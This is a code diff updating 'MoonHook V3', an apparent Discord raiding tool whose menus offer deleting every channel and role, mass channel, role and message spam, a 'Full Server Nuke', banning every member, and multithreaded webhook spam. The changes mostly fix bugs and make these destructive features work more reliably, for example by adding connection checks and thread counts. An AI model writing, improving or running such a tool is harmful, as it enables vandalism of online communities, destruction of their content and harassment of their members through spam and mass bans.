@@ -1,8 +1,5 @@
-# // MoonHook V3 1.0.0
+# // MoonHook V3
 # Original by Tobias, V3 by Jasper
-
-# NOTE: Most of the code is inside the libraries
-# TODO: Fix guild error: https://cdn.discordapp.com/attachments/1330571297876607040/1449013739620925551/image.png?ex=693d5ab4&is=693c0934&hm=82a13beb0f08c44ff9785a535b5ca9a077563a35588fd21a6296ebfbcf1f2171&
 
 from datetime import datetime
 from moonhook_bots.core import (
@@ -34,7 +31,7 @@ $$$$  /$$$$ |/$$$$$$  |/$$$$$$  |$$$$$$$  |$$    $$ |/$$$$$$  |/$$$$$$  |$$ |_/$
 $$ $$ $$/$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$ |  $$ |$$   $$<  
 $$ |$$$/ $$ |$$ \__$$ |$$ \__$$ |$$ |  $$ |$$ |  $$ |$$ \__$$ |$$ \__$$ |$$$$$$  \ 
 $$ | $/  $$ |$$    $$/ $$    $$/ $$ |  $$ |$$ |  $$ |$$    $$/ $$    $$/ $$ | $$  |
-$$/      $$/  $$$$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$/   $$$$$$/  $$/   $$/   V3 1.0.0!
+$$/      $$/  $$$$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$/   $$$$$$/  $$/   $$/   V3.0.0!
 
 """
 
@@ -68,7 +65,7 @@ $$$$$$$/  $$/ $$$$$$$/   $$$$$$$/  $$$$$$/  $$/        $$$$$$$/       $$$$$$$/  
 def intInput(t):
     try:
         return int(input(f"{mainColor}MoonHook | {t}{rst}"))
-    except:
+    except ValueError:
         return 1
 
 
@@ -76,7 +73,7 @@ def strInput(t):
     return input(f"{mainColor}MoonHook | {t}{rst}")
 
 
-def BotsPanel(Token: str, TargetGuild):
+def BotsPanel(Token: str, GuildID: int):
     Logger.clear()
 
     botClient = GetBotClient()
@@ -89,7 +86,15 @@ def BotsPanel(Token: str, TargetGuild):
         f"\nMoonHook Bot Panel\n 1. Activate Bot\n 2. Delete All Channels\n 3. Channel Spam\n 4. Delete All Roles\n 5. Role Spam\n {Logger.rgb_to_ansi(255, 0, 0)}6. ⚠️ Full Server Nuke{rst}\n 7. Deactivate Bot\n 8. Message Spam\n{Logger.rgb_to_ansi(255, 0, 0)} 9. ⚠️Ban Everyone\n 10. Back to main menu"
     )
 
-    selection = intInput("Select Option (1-7): ")
+    selection = intInput("Select Option (1-10): ")
+
+    if selection in [2, 3, 4, 5, 6, 8, 9]:
+        TargetGuild = GetGuildByID(GuildID)
+        if TargetGuild is None or not hasattr(botClient, "loop_ref"):
+            Logger.Log("Bot is not connected or Guild not found! Ensure the bot is running and wait a moment.")
+            Logger.AwaitInput()
+            BotsPanel(Token, GuildID)
+            return
 
     if selection == 1:
         Logger.Log("Attempting to start bot..")
@@ -101,7 +106,7 @@ def BotsPanel(Token: str, TargetGuild):
 
         Logger.Log("If you got no error messages, this means that the bot had started.")
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 2:
         Logger.Log("Attempting to delete every channel..")
 
@@ -111,7 +116,7 @@ def BotsPanel(Token: str, TargetGuild):
         future.result()
 
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 3:
         cspmtxt = strInput("Channel name: ")
         cspmamnt = intInput("Amount of channels: ")
@@ -123,7 +128,7 @@ def BotsPanel(Token: str, TargetGuild):
         )
         future.result()
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 4:
         Logger.Log("Attempting to delete roles..")
 
@@ -132,7 +137,7 @@ def BotsPanel(Token: str, TargetGuild):
         )
         future.result()
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 5:
         rspmtxt = strInput("Role name: ")
         rspmamnt = intInput("Amount of roles: ")
@@ -145,19 +150,19 @@ def BotsPanel(Token: str, TargetGuild):
         )
         future.result()
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 6:
         messagespamtext = strInput("Message to spam: ")
         messagespamcooldown = intInput("Message spam cooldown(s): ")
         channelspamtext = strInput("Channel, Role, Webhook names: ")
         amounttospam = intInput("Amount of channels, roles, webhooks to spam: ")
         _confirmation = strInput("Are you sure you want to spam everything? (y/n)")
-        Logger.Log("Performing a full server nuke..")
+        Logger.Log("Performing a full server nuke.. (this may take some time so load)")
 
         if _confirmation.lower().strip() != "y":
             Logger.Log("Cancelled.")
             Logger.AwaitInput()
-            BotsPanel(Token, TargetGuild)
+            BotsPanel(Token, GuildID)
 
         # // Delete stuff
         asyncio.run_coroutine_threadsafe(
@@ -187,13 +192,19 @@ def BotsPanel(Token: str, TargetGuild):
         ).result()
 
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 7:
+        if not hasattr(botClient, "loop_ref"):
+            Logger.Log("Bot is not running!")
+            Logger.AwaitInput()
+            BotsPanel(Token, GuildID)
+            return
+
         Logger.Log("Attempting to stop bot.. (Bot may take a bit to go offline.)")
 
         asyncio.run_coroutine_threadsafe(stop_bot(), botClient.loop_ref)
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 8:
         messagespamtext = strInput("Text to spam: ")
         messagespamcooldown = intInput("Spam cooldown: ")
@@ -209,14 +220,14 @@ def BotsPanel(Token: str, TargetGuild):
             botClient.loop_ref,
         ).result()
         Logger.AwaitInput()
-        BotsPanel(Token, TargetGuild)
+        BotsPanel(Token, GuildID)
     elif selection == 9:
         _confirmation = strInput("Are you sure you want to ban everyone? (y/n): ")
 
         if _confirmation.lower().strip() != "y":
             Logger.Log("Cancelled.")
             Logger.AwaitInput()
-            BotsPanel(Token, TargetGuild)
+            BotsPanel(Token, GuildID)
 
         Logger.Log("Attempting to ban everyone..")
         asyncio.run_coroutine_threadsafe(ban_everyone(TargetGuild), botClient.loop_ref)
@@ -241,7 +252,7 @@ def WebhookPanel(url: str):
 
     if selection == 1:
         print("Select Content Type\n 1. Plain Text\n 2. JSON string")
-        cType = strInput("Select Content Type (1-2): ")
+        cType = intInput("Select Content Type (1-2): ")
         content = strInput("Content to send: ")
 
         if cType == 1:
@@ -278,11 +289,12 @@ def WebhookPanel(url: str):
         cType = intInput("Select Content Type (1-2): ")
         content = strInput("Content to send: ")
         delay = intInput("Message Delay: ")
+        threads = intInput("Number of threads (recommended 5-10): ")
 
         Logger.Log("Beginning webhook spam...")
 
         try:
-            hook.WebhookSpam(cType, content, delay)
+            hook.WebhookSpam(cType, content, delay, threads)
         except KeyboardInterrupt:
             WebhookPanel(url)
 
@@ -359,7 +371,7 @@ Original moonhook by @_tobiaszeq_""")
 
         threading.Thread(target=_cnt, daemon=True).start()
 
-        BotsPanel(token, GetGuildByID(guildID))
+        BotsPanel(token, guildID)
     elif selection == 3:
         Logger.clear()
         sys.exit()
@@ -368,4 +380,8 @@ Original moonhook by @_tobiaszeq_""")
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        Logger.Log("\nExitted.")
+        sys.exit(0)
